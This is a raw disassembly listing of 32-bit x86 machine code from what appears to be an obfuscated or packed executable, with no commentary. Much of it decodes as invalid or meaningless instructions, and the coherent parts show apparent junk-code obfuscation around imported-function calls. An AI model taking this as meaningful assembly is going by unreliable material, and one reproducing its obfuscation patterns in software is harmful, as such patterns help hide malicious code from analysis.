  41c161:	xor    BYTE PTR [ebp+0x1462e2d9],0xf
  41c168:	inc    esp
  41c169:	fild   DWORD PTR [ecx+edi*8]
  41c16c:	add    ebp,DWORD PTR [ebx+0x65]
  41c16f:	pop    edi
  41c170:	pop    ds
  41c171:	rol    ebx,1
  41c173:	dec    esi
  41c174:	jmp    0x2f7cdcf7
  41c179:	mov    edx,0x351f38f4
  41c17e:	stos   BYTE PTR es:[edi],al
  41c17f:	xor    ecx,DWORD PTR [edx]
  41c181:	add    ax,WORD PTR [esi]
  41c184:	mov    ah,0x7a
  41c186:	(bad)  
  41c187:	lock dec al
  41c18a:	ret    
  41c18b:	jmp    0xa211:0x3158d4ff
  41c192:	sub    al,0xb6
  41c194:	sbb    BYTE PTR [ecx-0x66],ch
  41c197:	mov    dl,0x20
  41c199:	pop    esi
  41c19a:	shr    DWORD PTR [eax+0x14],cl
  41c19d:	cmc    
  41c19e:	cmp    DWORD PTR [edi-0xc31e66f],esi
  41c1a4:	sahf   
  41c1a5:	adc    DWORD PTR [ecx],ecx
  41c1a7:	test   eax,0x72a40feb
  41c1ad:	aas    
  41c1ae:	aam    0x2b
  41c1b0:	fnstsw WORD PTR [esi]
  41c1b2:	cmp    BYTE PTR [esi],cl
  41c1b4:	aam    0x95
  41c1b6:	adc    al,0x82
  41c1b8:	cld    
  41c1b9:	sahf   
  41c1ba:	call   0x2d58:0x75cc4b19
  41c1c1:	(bad)  
  41c1c3:	mov    al,ds:0xec221b44
  41c1c8:	xchg   ebx,eax
  41c1c9:	adc    ch,BYTE PTR [ebx-0x74]
  41c1cc:	rcr    DWORD PTR [ebp*8-0x71d166d7],1
  41c1d3:	addr16 (bad) 
  41c1d5:	rcl    BYTE PTR [esi-0x4f],1
  41c1d8:	sub    dh,BYTE PTR [edx+0x78]
  41c1db:	add    eax,DWORD PTR [edx+0x68]
  41c1de:	rol    DWORD PTR [ecx+0x79],cl
  41c1e1:	sti    
  41c1e2:	cmp    BYTE PTR [edx+0x5fe97b1c],dl
  41c1e8:	loop   0x41c239
  41c1ea:	mov    edi,0x2a7ed813
  41c1ef:	lods   al,BYTE PTR ds:[esi]
  41c1f0:	and    al,0x1e
  41c1f2:	cld    
  41c1f3:	inc    edx
  41c1f4:	mov    dh,0xe8
  41c1f6:	sub    dh,BYTE PTR [edx-0x70]
  41c1f9:	rcr    eax,cl
  41c1fb:	sbb    al,0xf0
  41c1fd:	push   edi
  41c1fe:	stos   DWORD PTR es:[edi],eax
  41c1ff:	mov    BYTE PTR [esi-0x70],ah
  41c202:	ins    DWORD PTR es:[edi],dx
  41c203:	leave  
  41c204:	repnz popf 
  41c206:	or     DWORD PTR [edx],edi
  41c208:	pop    ss
  41c209:	jne    0x41c26c
  41c20b:	lds    esi,FWORD PTR [esi-0x21]
  41c20e:	jmp    0x5a13:0xd0e608af
  41c215:	jno    0x41c1a0
  41c217:	cmp    bl,BYTE PTR [ebx-0x44]
  41c21a:	mov    ebp,DWORD PTR [ebx+0x5823d390]
  41c220:	jo     0x41c245
  41c222:	into   
  41c223:	adc    al,0xdb
  41c225:	push   edi
  41c226:	mov    ebx,0x2ecea517
  41c22b:	inc    ecx
  41c22c:	loope  0x41c26c
  41c22e:	sub    eax,0x5da7818d
  41c233:	cli    
  41c234:	push   0xfffffffa
  41c236:	push   ss
  41c237:	jg     0x41c240
  41c239:	push   ss
  41c23a:	mov    ebp,0x7682c4cc
  41c23f:	pop    ds
  41c240:	arpl   WORD PTR [esi+edi*1-0x67190096],cx
  41c247:	rcl    al,1
  41c249:	mov    bh,0xee
  41c24b:	cmp    al,0x83
  41c24d:	sub    BYTE PTR [edi+0x3d],al
  41c250:	jg     0x41c2bb
  41c252:	or     DWORD PTR ss:[ebx-0x73],ecx
  41c256:	ret    0x7e35
  41c259:	int    0x59
  41c25b:	jmp    FWORD PTR [esi+0xb0431ea]
  41c261:	div    DWORD PTR [ebx-0x49]
  41c264:	js     0x41c298
  41c266:	jl     0x41c2ad
  41c268:	mov    ds:0xaa5b9de8,al
  41c26d:	cmp    BYTE PTR [edx-0x62],bh
  41c270:	mov    ebp,0x93c35ab9
  41c275:	icebp  
  41c276:	or     DWORD PTR [edx+0x4b44807a],eax
  41c27c:	jl     0x41c2c3
  41c27e:	xlat   BYTE PTR ds:[ebx]
  41c27f:	xor    al,0xf1
  41c281:	arpl   WORD PTR [edi],di
  41c283:	sahf   
  41c284:	fcmovbe st,st(1)
  41c286:	cmc    
  41c287:	lock lea ebx,[edi]
  41c28a:	cld    
  41c28b:	(bad)  
  41c28d:	pop    ds
  41c28e:	fdiv   DWORD PTR [edi-0x2d7213d7]
  41c294:	jae    0x41c2a9
  41c296:	jge    0x41c272
  41c298:	ss mov ecx,0x71faeb65
  41c29e:	in     eax,0x76
  41c2a0:	sahf   
  41c2a1:	and    eax,DWORD PTR [ebx+0x73ca773e]
  41c2a7:	(bad)  
  41c2a8:	out    0x48,eax
  41c2aa:	mov    dh,0x21
  41c2ac:	mov    al,ds:0xe2c04c19
  41c2b1:	test   BYTE PTR [eax+0x4133485d],dh
  41c2b7:	jne    0x41c2d0
  41c2b9:	jle    0x41c333
  41c2bb:	cli    
  41c2bc:	iret   
  41c2bd:	(bad)  
  41c2bf:	mov    BYTE PTR [edx],dh
  41c2c1:	sar    dl,1
  41c2c3:	lea    ebp,[edx+edx*2+0x6e]
  41c2c7:	xchg   ah,dh
  41c2c9:	sbb    al,0x56
  41c2cb:	or     ah,BYTE PTR [edi+0x29]
  41c2ce:	hlt    
  41c2cf:	xchg   ecx,eax
  41c2d0:	in     eax,dx
  41c2d1:	mov    bh,0xa5
  41c2d3:	mov    esp,DWORD PTR [edi-0x6a19378b]
  41c2d9:	bound  ebp,QWORD PTR ds:[ebp+0x4dfddda3]
  41c2e0:	cmc    
  41c2e1:	mov    cl,0xb7
  41c2e3:	inc    esp
  41c2e4:	cs clc 
  41c2e6:	jmp    0x110a:0xc94acc64
  41c2ed:	imul   esi,DWORD PTR [esi*4+0x55e50152],0x4e
  41c2f5:	ja     0x41c2c6
  41c2f7:	push   edx
  41c2f8:	fwait
  41c2f9:	adc    eax,0x2e88981b
  41c2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2ff:	sar    BYTE PTR [eax],cl
  41c301:	xchg   ecx,eax
  41c302:	fist   DWORD PTR [edx-0x67]
  41c305:	sub    DWORD PTR [edx-0x28],edi
  41c308:	push   edi
  41c309:	mov    dh,0x58
  41c30b:	jecxz  0x41c2f5
  41c30d:	jmp    0xf453c00d
  41c312:	cmp    al,BYTE PTR [esi]
  41c314:	cmp    al,0x3c
  41c316:	adc    BYTE PTR [eax-0x6f],dl
  41c319:	ja     0x41c360
  41c31b:	xor    eax,0x5e8c
  41c320:	mov    DWORD PTR [ebp-0x48],eax
  41c323:	sbb    DWORD PTR ds:0x4284e5,edi
  41c329:	mov    DWORD PTR [ebp-0x13c],0x7b18
  41c333:	mov    DWORD PTR [ebp-0x138],0x1169
  41c33d:	mov    DWORD PTR [ebp-0x12c],0x1379
  41c347:	sbb    DWORD PTR ds:0x428555,ecx
  41c34d:	mov    eax,DWORD PTR [ebp-0x12c]
  41c353:	adc    DWORD PTR ds:0x4284c9,0x44e5
  41c35d:	mov    ecx,0x5856
  41c362:	sub    ecx,eax
  41c364:	and    DWORD PTR ds:0x428425,ecx
  41c36a:	shr    ecx,0x2
  41c36d:	cmp    DWORD PTR ds:0x42856d,0x0
  41c374:	mov    DWORD PTR ds:0x428419,0x1c8e
  41c37e:	mov    DWORD PTR ds:0x4284f9,0x3a72
  41c388:	mov    DWORD PTR ds:0x42833d,0x2994
  41c392:	jmp    0x41c475
  41c397:	mov    eax,ds:0x4284dd
  41c39c:	cmp    DWORD PTR ds:0x42856d,0x0
  41c3a3:	jge    0x41c3d2
  41c3a9:	push   DWORD PTR [ebp-0x20]
  41c3ac:	push   DWORD PTR [ebp-0x24]
  41c3af:	push   DWORD PTR [ebp-0x1c]
  41c3b2:	call   DWORD PTR ds:0x42e120
  41c3b8:	and    DWORD PTR ds:0x428409,edx
  41c3be:	sub    DWORD PTR ds:0x428369,0x53c2
  41c3c8:	and    DWORD PTR ds:0x42836d,0x428579
  41c3d2:	or     DWORD PTR ds:0x428549,edi
  41c3d8:	sbb    DWORD PTR ds:0x428365,0x428555
  41c3e2:	cmp    DWORD PTR ds:0x428471,0x0
  41c3e9:	mov    DWORD PTR ds:0x428441,0x3b49
  41c3f3:	mov    DWORD PTR ds:0x428451,0x7933
  41c3fd:	mov    DWORD PTR ds:0x428465,0x897
  41c407:	mov    DWORD PTR ds:0x428359,0x5a92
  41c411:	jmp    0x41c475
  41c416:	mov    eax,0x55e0
  41c41b:	movzx  eax,WORD PTR ds:0x4284cd
  41c422:	cmp    DWORD PTR ds:0x428471,0x0
  41c429:	ja     0x41c45f
  41c42f:	push   DWORD PTR [ebp-0x18]
  41c432:	push   DWORD PTR [ebp-0x18]
  41c435:	push   DWORD PTR [ebp-0x18]
  41c438:	push   DWORD PTR [ebp-0x20]
  41c43b:	push   0x8c53
  41c440:	push   DWORD PTR [ebp-0x14]
  41c443:	call   DWORD PTR ds:0x42e068
  41c449:	add    DWORD PTR ds:0x428405,ecx
  41c44f:	not    DWORD PTR ds:0x4284d9
  41c455:	adc    DWORD PTR ds:0x428449,0x2c56
  41c45f:	add    DWORD PTR ds:0x4284f5,0x42842d
  41c469:	add    DWORD PTR ds:0x42840d,edi
  41c46f:	sub    DWORD PTR ds:0x42847d,edx
  41c475:	sub    ecx,0x5be6
  41c47b:	mov    eax,DWORD PTR [ebp-0x138]
  41c481:	xor    DWORD PTR ds:0x428435,0x2de
  41c48b:	imul   ecx,eax
  41c48e:	mov    eax,ds:0x428465
  41c493:	add    DWORD PTR ds:0x42857d,eax
  41c499:	mov    eax,DWORD PTR [ebp-0x13c]
  41c49f:	and    ecx,eax
  41c4a1:	cmp    DWORD PTR ds:0x428579,0x0
  41c4a8:	mov    DWORD PTR ds:0x42845d,0x420b
  41c4b2:	mov    DWORD PTR ds:0x4284d9,0x3ab4
  41c4bc:	mov    DWORD PTR ds:0x428479,0x3618
  41c4c6:	jmp    0x41c90c
  41c4cb:	mov    DWORD PTR ds:0x428419,0xf37
  41c4d5:	not    eax
  41c4d7:	cmp    DWORD PTR ds:0x428579,0x0
  41c4de:	jg     0x41c505
  41c4e4:	push   0x2612
  41c4e9:	push   DWORD PTR [ebp-0x1c]
  41c4ec:	push   DWORD PTR [ebp-0x14]
  41c4ef:	call   DWORD PTR ds:0x42e06c
  41c4f5:	and    DWORD PTR ds:0x428459,0x4284e9
  41c4ff:	add    DWORD PTR ds:0x42834d,edi
  41c505:	xor    DWORD PTR ds:0x42841d,edx
  41c50b:	sbb    DWORD PTR ds:0x428465,0x428455
  41c515:	mov    DWORD PTR ds:0x428479,0x491d
  41c51f:	add    DWORD PTR ds:0x428351,ebx
  41c525:	jmp    0x41c90c
  41c52a:	sub    ch,BYTE PTR [esi-0x62]
  41c52d:	sbb    DWORD PTR [edx-0x7c9145e7],edi
  41c533:	pop    ebp
  41c534:	and    al,0x9e
  41c536:	sub    cl,BYTE PTR [ebp+0x41609e0e]
  41c53c:	sar    BYTE PTR [esi-0x41413bb6],0xa7
  41c543:	aaa    
  41c544:	or     al,0x8b
  41c546:	loopne 0x41c586
  41c548:	jecxz  0x41c592
  41c54a:	out    dx,eax
  41c54b:	mov    cl,0x0
  41c54d:	cmp    BYTE PTR [ebx],ch
  41c54f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c550:	push   ds
  41c551:	pop    ss
  41c552:	pop    ebp
  41c553:	cli    
  41c554:	jb     0x41c520
  41c556:	push   cs
  41c557:	cmp    esp,DWORD PTR [esi]
  41c559:	imul   esi,edi,0xa42ee97c
  41c55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c560:	stos   DWORD PTR es:[edi],eax
  41c561:	inc    eax
  41c562:	push   es
  41c563:	in     al,0x12
  41c565:	lock enter 0xa837,0xcc
  41c56a:	cmp    al,0xa8
  41c56c:	jb     0x41c57f
  41c56e:	sub    ecx,DWORD PTR [edi+0x38]
  41c571:	xchg   edi,eax
  41c572:	inc    edi
  41c573:	popf   
  41c574:	cdq    
  41c575:	inc    ecx
  41c576:	jae    0x41c57e
  41c578:	test   BYTE PTR [ecx+0xb],dl
  41c57b:	call   0xc75ecf19
  41c580:	(bad)  
  41c581:	int3   
  41c582:	sub    al,0x9a
  41c585:	mov    ch,0xfe
  41c587:	xor    cl,dl
  41c589:	frstor [eax+0x46c8d45c]
  41c58f:	gs jb  0x41c515
  41c592:	ret    0x9658
  41c595:	push   ss
  41c596:	mov    bl,0xfa
  41c598:	mov    ds:0x528c1300,eax
  41c59d:	pop    ebx
  41c59e:	scas   eax,DWORD PTR es:[edi]
  41c59f:	cmp    DWORD PTR [eax],ecx
  41c5a1:	call   0xf43e:0xb38d0f52
  41c5a8:	stc    
  41c5a9:	jns    0x41c613
  41c5ab:	mov    ds:0xb15686ab,al
  41c5b0:	popf   
  41c5b1:	and    BYTE PTR [eax],bl
  41c5b3:	or     ecx,0xffffffb2
  41c5b6:	loop   0x41c547
  41c5b8:	mov    esi,DWORD PTR [esi-0x55]
  41c5bb:	js     0x41c588
  41c5bd:	cld    
  41c5be:	hlt    
  41c5bf:	inc    edx
  41c5c0:	push   edi
  41c5c1:	out    0x2,eax
  41c5c3:	sahf   
  41c5c4:	es jne 0x41c599
  41c5c7:	sub    BYTE PTR [ebx-0x65],bl
  41c5ca:	and    eax,0x203636c7
  41c5cf:	mov    al,ds:0x66b867b
  41c5d4:	ja     0x41c60c
  41c5d6:	ret    
  41c5d7:	popf   
  41c5d8:	xchg   ebx,eax
  41c5d9:	mov    ecx,0xa9aec151
  41c5de:	inc    edi
  41c5df:	loope  0x41c5a8
  41c5e1:	fwait
  41c5e2:	aad    0xdb
  41c5e4:	sub    BYTE PTR [ebx],ch
  41c5e6:	sub    edi,eax
  41c5e8:	cmp    esp,edi
  41c5ea:	pop    edx
  41c5eb:	mov    dl,0x92
  41c5ed:	fadd   DWORD PTR [ebp+edx*8-0x76]
  41c5f1:	je     0x41c598
  41c5f3:	xchg   esp,eax
  41c5f4:	stos   DWORD PTR es:[edi],eax
  41c5f5:	popf   
  41c5f6:	sbb    ah,bh
  41c5f8:	dec    ebp
  41c5f9:	mov    cl,0x9e
  41c5fb:	idiv   DWORD PTR [esi-0x3]
  41c5fe:	xor    eax,0xf89ef9e7
  41c603:	outs   dx,DWORD PTR ds:[esi]
  41c604:	loope  0x41c58f
  41c606:	lods   al,BYTE PTR ds:[esi]
  41c607:	mov    eax,0x381abbfd
  41c60c:	call   0x74b3:0xd14052b2
  41c613:	(bad)  
  41c614:	jbe    0x41c5fd
  41c616:	cmp    ecx,edi
  41c618:	xchg   ebp,eax
  41c619:	adc    ecx,ebp
  41c61b:	shl    DWORD PTR [ecx],0x61
  41c61e:	dec    eax
  41c61f:	aam    0x4
  41c621:	aas    
  41c622:	(bad)  
  41c623:	or     DWORD PTR ds:0xc686e319,edi
  41c629:	jecxz  0x41c684
  41c62b:	cmp    DWORD PTR [edx-0x4137efdd],edi
  41c631:	std    
  41c632:	cdq    
  41c633:	cs retf 0x8fdb
  41c637:	in     eax,0xf7
  41c639:	scas   eax,DWORD PTR es:[edi]
  41c63a:	ss in  al,dx
  41c63c:	or     BYTE PTR [ebx-0x6a35007e],0x28
  41c643:	(bad)  [ebp+0x7a]
  41c646:	out    dx,eax
  41c647:	mov    bl,BYTE PTR [ecx-0x1d59a838]
  41c64d:	(bad)  
  41c64e:	shl    BYTE PTR [ebp+0x3def351f],cl
  41c654:	int3   
  41c655:	mov    ebx,0x1a4f02cb
  41c65a:	jge    0x41c649
  41c65c:	(bad)  
  41c65d:	mov    dh,0x26
  41c65f:	lds    esp,FWORD PTR [ecx+0x1e]
  41c662:	(bad)  
  41c663:	call   0x7443021f
  41c668:	sbb    ah,0xe7
  41c66b:	jle    0x41c661
  41c66d:	test   al,0x5f
  41c66f:	pushf  
  41c670:	sar    DWORD PTR [edx+eax*1],cl
  41c673:	in     eax,0xf3
  41c675:	add    BYTE PTR [ebp+0x660b875],dl
  41c67b:	es jmp 0x41c6d6
  41c67e:	fdiv   QWORD PTR [ecx+0x4bfe211c]
  41c684:	in     al,0xb
  41c686:	cmp    eax,0xc9a064a7
  41c68b:	jns    0x41c652
  41c68d:	push   ebp
  41c68e:	pop    edx
  41c68f:	jno    0x41c6c8
  41c691:	push   cs
  41c692:	mov    cl,BYTE PTR [edi-0x510c0036]
  41c698:	dec    esp
  41c699:	sahf   
  41c69a:	iret   
  41c69b:	add    DWORD PTR [ebp+0x230b886d],edi
  41c6a1:	ret    
  41c6a2:	or     BYTE PTR [ebp+0x499dba74],ah
  41c6a8:	push   eax
  41c6a9:	fwait
  41c6aa:	js     0x41c690
  41c6ac:	push   es
  41c6ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6ae:	outs   dx,BYTE PTR ds:[esi]
  41c6af:	iret   
  41c6b0:	shufps xmm2,XMMWORD PTR [edx+0x1b],0x3c
  41c6b5:	fmul   DWORD PTR [ebp-0x2f9f31a2]
  41c6bb:	in     al,0x4b
  41c6bd:	ss mov edi,0xc8dd013d
  41c6c3:	inc    eax
  41c6c4:	scas   al,BYTE PTR es:[edi]
  41c6c5:	loope  0x41c6e7
  41c6c7:	adc    BYTE PTR [edi+0x13372e48],bl
  41c6cd:	sbb    dh,BYTE PTR [ecx-0x38]
  41c6d0:	or     al,0x2a
  41c6d2:	out    dx,eax
  41c6d3:	xlat   BYTE PTR ds:[ebx]
  41c6d4:	mov    edx,0xa8f420f6
  41c6d9:	cwde   
  41c6da:	sbb    al,bl
  41c6dc:	nop
  41c6dd:	xchg   esp,eax
  41c6de:	shl    DWORD PTR [ecx+0x37],1
  41c6e1:	ja     0x41c6d1
  41c6e3:	and    edi,DWORD PTR [ecx]
  41c6e5:	cs xchg edi,eax
  41c6e7:	js     0x41c767
  41c6e9:	sub    al,BYTE PTR ss:0xb272527b
  41c6f0:	test   DWORD PTR [edi+eiz*8+0x4a8cae39],esi
  41c6f7:	sbb    BYTE PTR [edi-0x7ba36657],0x7a
  41c6fe:	lds    esp,FWORD PTR [ebp-0xf72fe0a]
  41c704:	int    0x7c
  41c706:	inc    esp
  41c707:	test   eax,0xf706702
  41c70c:	pminub mm7,QWORD PTR [ebp+0x7777bdb3]
  41c713:	mov    al,BYTE PTR [esi-0x1102a234]
  41c719:	cdq    
  41c71a:	xchg   esp,eax
  41c71b:	pusha  
  41c71c:	add    DWORD PTR [ecx-0x53],edi
  41c71f:	lods   eax,DWORD PTR ds:[esi]
  41c720:	xchg   DWORD PTR [esi],eax
  41c722:	push   0x69
  41c724:	mov    dh,0x78
  41c726:	in     eax,dx
  41c727:	push   0x13
  41c729:	sub    DWORD PTR [ebp-0x33],ecx
  41c72c:	dec    eax
  41c72d:	mov    bl,dh
  41c72f:	out    0x32,eax
  41c731:	pushf  
  41c732:	inc    edx
  41c733:	pop    ecx
  41c734:	hlt    
  41c735:	bnd jnp 0x41c6f3
  41c738:	stc    
  41c739:	add    al,BYTE PTR [edi]
  41c73b:	fidivr WORD PTR [ebp-0x51]
  41c73e:	jmp    0x3108500c
  41c743:	jmp    0x3d35:0x7b380e4d
  41c74a:	push   edx
  41c74b:	add    eax,0xd4e7c566
  41c750:	and    ebp,DWORD PTR [ebx-0x6e]
  41c753:	fst    QWORD PTR [edx]
  41c755:	adc    cl,dh
  41c757:	xchg   ebp,eax
  41c758:	xor    ah,BYTE PTR [eax+ecx*1+0x1d179f0f]
  41c75f:	and    DWORD PTR [eax],ebx
  41c761:	xchg   ecx,eax
  41c762:	fistp  WORD PTR [esi+ecx*2+0x3a]
  41c766:	adc    DWORD PTR [eax],esi
  41c768:	or     bh,BYTE PTR [ebx+esi*4]
  41c76b:	xchg   edx,eax
  41c76c:	out    0x56,al
  41c76e:	add    al,bh
  41c770:	mov    dh,0xfc
  41c772:	jge    0x41c705
  41c774:	mov    al,ds:0xb89691df
  41c779:	push   0xa3caca8
  41c77e:	or     BYTE PTR [edx-0x70],ah
  41c781:	dec    edi
  41c782:	pop    ebx
  41c783:	jmp    0x2694:0x26d73f47
  41c78a:	or     BYTE PTR [edx],0x7f
  41c78d:	daa    
  41c78e:	nop
  41c78f:	cld    
  41c790:	fmul   QWORD PTR [ebx]
  41c792:	sub    eax,0x1901276b
  41c797:	sti    
  41c798:	jo     0x41c80f
  41c79a:	inc    ah
  41c79c:	ins    DWORD PTR es:[edi],dx
  41c79d:	popf   
  41c79e:	fistp  DWORD PTR [edx+ebx*2+0x31]
  41c7a2:	call   0x8d366608
  41c7a7:	ror    esp,1
  41c7a9:	push   ebx
  41c7aa:	aad    0xda
  41c7ac:	bound  esi,QWORD PTR [eax+0x0]
  41c7af:	repz out dx,al
  41c7b1:	pop    eax
  41c7b2:	std    
  41c7b3:	mov    ebx,0x4e4cc0e6
  41c7b8:	mov    DWORD PTR [eax+0x5efc62ee],0xf4410b2b
  41c7c2:	(bad)  [esi+0x4]
  41c7c5:	fisttp DWORD PTR [esi+0x4b]
  41c7c8:	mov    edx,0x48362789
  41c7cd:	out    dx,eax
  41c7ce:	or     al,0xc
  41c7d0:	or     DWORD PTR [ebx],ebx
  41c7d2:	or     bl,bh
  41c7d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7d5:	mov    ah,0xe5
  41c7d7:	mov    ch,0x7f
  41c7d9:	add    DWORD PTR [edx],ebx
  41c7db:	aam    0xf
  41c7dd:	fadd   QWORD PTR [ebp-0x16]
  41c7e0:	and    ebx,DWORD PTR [esi]
  41c7e2:	push   eax
  41c7e3:	fisttp DWORD PTR [edx+0x7]
  41c7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7e7:	sbb    DWORD PTR [ebp+0x70],0xffffffa1
  41c7eb:	push   ebp
  41c7ec:	scas   al,BYTE PTR es:[edi]
  41c7ed:	push   es
  41c7ee:	add    ch,BYTE PTR [edi-0x3d10ce27]
  41c7f4:	daa    
  41c7f5:	xchg   esp,eax
  41c7f6:	add    al,0x39
  41c7f8:	push   ebx
  41c7f9:	cli    
  41c7fa:	in     al,dx
  41c7fb:	js     0x41c82e
  41c7fd:	pop    edx
  41c7fe:	dec    edx
  41c7ff:	sahf   
  41c800:	and    eax,0x647769d3
  41c805:	in     al,0xb1
  41c807:	ins    BYTE PTR es:[edi],dx
  41c808:	ins    BYTE PTR es:[edi],dx
  41c809:	and    BYTE PTR [edi],0xcd
  41c80c:	adc    bh,BYTE PTR [ebx-0x1ff1f5c8]
  41c812:	sbb    dl,BYTE PTR [ecx]
  41c814:	cmp    ebx,ecx
  41c816:	mov    ds:0xfb7e8800,al
  41c81b:	add    BYTE PTR [ecx+eiz*1],dh
  41c81e:	es call 0xd8e2:0xccc11803
  41c826:	clc    
  41c827:	mov    bh,0x4
  41c829:	loop   0x41c826
  41c82b:	cmp    al,bl
  41c82d:	loopne 0x41c7b0
  41c82f:	rcl    DWORD PTR [eax+0x78],1
  41c832:	cmp    DWORD PTR [eax+edx*2],ebx
  41c835:	cli    
  41c836:	mov    ebp,0xd944aa1c
  41c83b:	xchg   BYTE PTR [ebx*4+0x54aac8b0],al
  41c842:	pop    eax
  41c843:	pop    ecx
  41c844:	rcpps  xmm5,xmm0
  41c847:	jbe    0x41c88e
  41c849:	icebp  
  41c84a:	push   cs
  41c84b:	fsubr  st,st(7)
  41c84d:	sub    al,0xd5
  41c84f:	jmp    0xe1ec8660
  41c854:	pop    eax
  41c855:	cmp    BYTE PTR [edx],bl
  41c857:	lods   al,BYTE PTR ds:[esi]
  41c858:	jae    0x41c818
  41c85a:	repnz sbb eax,0xd33ded24
  41c860:	(bad)  
  41c861:	adc    eax,DWORD PTR [ebp+0x2e]
  41c864:	outs   dx,DWORD PTR ds:[esi]
  41c865:	retf   
  41c866:	or     dh,BYTE PTR [esi-0x4c]
  41c869:	ins    DWORD PTR es:[edi],dx
  41c86a:	push   0x2e
  41c86c:	scas   al,BYTE PTR es:[edi]
  41c86d:	and    esi,DWORD PTR [ebx-0x33022e9a]
  41c873:	sub    edx,eax
  41c875:	call   0xa1bce94e
  41c87a:	dec    ebx
  41c87b:	int3   
  41c87c:	(bad)  
  41c87d:	(bad)  
  41c87e:	mov    ds:0xc891905e,eax
  41c883:	lds    esi,FWORD PTR [eax]
  41c885:	adc    eax,DWORD PTR [ecx]
  41c887:	int    0xb3
  41c889:	sub    al,0x9
  41c88b:	mov    ebp,0xe56c90af
  41c890:	and    dh,ch
  41c892:	fwait
  41c893:	(bad)  
  41c894:	repnz ins BYTE PTR es:[edi],dx
  41c896:	ret    0xd4af
  41c899:	cmp    DWORD PTR [bx+di+0x7f],0xffffff8e
  41c89e:	inc    ecx
  41c89f:	dec    esp
  41c8a0:	cwde   
  41c8a1:	sub    al,0xc3
  41c8a3:	sti    
  41c8a4:	mov    al,0xeb
  41c8a6:	adc    eax,edx
  41c8a8:	fld    QWORD PTR [eax]
  41c8aa:	or     al,0x1f
  41c8ac:	and    al,0xc0
  41c8ae:	cmp    ecx,DWORD PTR [ebx+ebx*2]
  41c8b1:	leave  
  41c8b2:	or     eax,0x129f3a7
  41c8b7:	jns    0x41c88c
  41c8b9:	mov    esi,0x777c635c
  41c8be:	test   al,0x78
  41c8c0:	dec    eax
  41c8c1:	and    edi,DWORD PTR [edi+0x54]
  41c8c4:	sbb    bh,BYTE PTR [esi+eax*8+0xe]
  41c8c8:	jmp    0x37c7b04
  41c8cd:	xchg   BYTE PTR [edx-0x51572d00],dh
  41c8d3:	xor    bh,dh
  41c8d5:	int    0x46
  41c8d7:	ja     0x41c8bb
  41c8d9:	into   
  41c8da:	mov    edx,DWORD PTR [edx]
  41c8dc:	mov    BYTE PTR [edx+0x7ff93d3c],bl
  41c8e2:	dec    edx
  41c8e3:	ret    
  41c8e4:	sbb    dh,BYTE PTR ds:0x1db9bb10
  41c8ea:	(bad)  
  41c8eb:	lock clc 
  41c8ed:	mov    WORD PTR [ebx-0x3b],?
  41c8f0:	inc    edi
  41c8f1:	daa    
  41c8f2:	mov    ds:0x8afdff02,eax
  41c8f7:	add    al,0xeb
  41c8f9:	popa   
  41c8fa:	dec    edx
  41c8fb:	repz inc ecx
  41c8fd:	aas    
  41c8fe:	nop
  41c8ff:	pop    ecx
  41c900:	fs xchg bh,al
  41c903:	arpl   WORD PTR [eax+0x71],si
  41c906:	popa   
  41c907:	mov    eax,0x86757df8
  41c90c:	mov    eax,0x3b18
  41c911:	or     DWORD PTR ds:0x42857d,0x428415
  41c91b:	sub    eax,ecx
  41c91d:	mov    ecx,DWORD PTR ds:0x42847d
  41c923:	sbb    ecx,DWORD PTR ds:0x4284d9
  41c929:	mov    DWORD PTR ds:0x42847d,ecx
  41c92f:	mov    DWORD PTR [ebp-0xfc],eax
  41c935:	movzx  eax,BYTE PTR ds:0x428359
  41c93c:	sub    eax,DWORD PTR ds:0x428339
  41c942:	mov    ds:0x428359,eax
  41c947:	mov    DWORD PTR [ebp-0x28],0x16d7
  41c94e:	mov    DWORD PTR [ebp-0x134],0x6b4
  41c958:	mov    eax,DWORD PTR [ebp-0x134]
  41c95e:	cmp    DWORD PTR ds:0x42857d,0x0
  41c965:	mov    ecx,0x4723
  41c96a:	mov    DWORD PTR ds:0x428341,0x48a0
  41c974:	jmp    0x41c9c9
  41c979:	mov    ecx,0x5cee
  41c97e:	cmp    DWORD PTR ds:0x42857d,0x0
  41c985:	jl     0x41c9b9
  41c98b:	push   0x8e3c
  41c990:	call   DWORD PTR ds:0x42e070
  41c996:	movzx  ecx,BYTE PTR ds:0x42847d
  41c99d:	sbb    DWORD PTR ds:0x428469,ecx
  41c9a3:	xor    DWORD PTR ds:0x42856d,edx
  41c9a9:	mov    DWORD PTR ds:0x4284e1,0x54fa
  41c9b3:	adc    DWORD PTR ds:0x428455,ebx
  41c9b9:	xor    ecx,DWORD PTR ds:0x428565
  41c9bf:	sub    DWORD PTR ds:0x428431,0x73c7
  41c9c9:	or     eax,0x4f70
  41c9ce:	cmp    DWORD PTR ds:0x42842d,0x0
  41c9d5:	mov    ecx,0x6758
  41c9da:	mov    ecx,0x329e
  41c9df:	mov    DWORD PTR ds:0x4284c5,ecx
  41c9e5:	mov    DWORD PTR ds:0x428469,edi
  41c9eb:	jmp    0x41ca37
  41c9f0:	mov    DWORD PTR ds:0x428365,0x5f4d
  41c9fa:	cmp    DWORD PTR ds:0x42842d,0x0
  41ca01:	jae    0x41ca29
  41ca07:	push   0x67b2
  41ca0c:	push   0x4f13
  41ca11:	call   DWORD PTR ds:0x42e074
  41ca17:	add    ecx,0x3ae9
  41ca1d:	sub    ecx,DWORD PTR ds:0x428359
  41ca23:	xor    ecx,DWORD PTR ds:0x42842d
  41ca29:	adc    DWORD PTR ds:0x42832d,ecx
  41ca2f:	adc    ecx,DWORD PTR ds:0x42842d
  41ca35:	not    ecx
  41ca37:	mov    ecx,DWORD PTR [ebp-0x28]
  41ca3a:	or     DWORD PTR ds:0x42847d,0x428461
  41ca44:	or     eax,ecx
  41ca46:	xor    ecx,ecx
  41ca48:	xor    ecx,DWORD PTR ds:0x428361
  41ca4e:	xor    DWORD PTR ds:0x428551,ecx
  41ca54:	sub    eax,0x5ff7
  41ca59:	mov    ecx,DWORD PTR ds:0x428359
  41ca5f:	sub    ecx,DWORD PTR ds:0x4284e9
  41ca65:	mov    DWORD PTR ds:0x428359,ecx
  41ca6b:	mov    DWORD PTR [ebp-0xc8],eax
  41ca71:	sub    DWORD PTR ds:0x428501,0xac
